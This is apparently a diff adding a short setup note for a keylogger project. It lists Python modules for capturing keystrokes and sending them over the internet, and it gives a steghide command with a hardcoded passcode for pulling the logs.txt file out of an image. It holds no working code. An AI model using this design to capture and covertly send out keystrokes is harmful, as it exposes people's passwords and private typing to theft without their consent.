@@ -1,0 +1,14 @@
+-For Keylogger :
+	--keyboard module : for analyzing the keystrokes
+	--os module : for file management
+	--time module : for getting required breaks
+	--requests module : to communicate over internet
+	--shutil : for downloading a image
+
+-For Steganography:
+	--Steghide (have to be in the path)
+
+-Command for getting the logs.txt from the image using steghide:
+	--Do it in CMD:
+		steghide extract -sf /path/to/the/image -p /passcode
+	here the passcode is : sidd
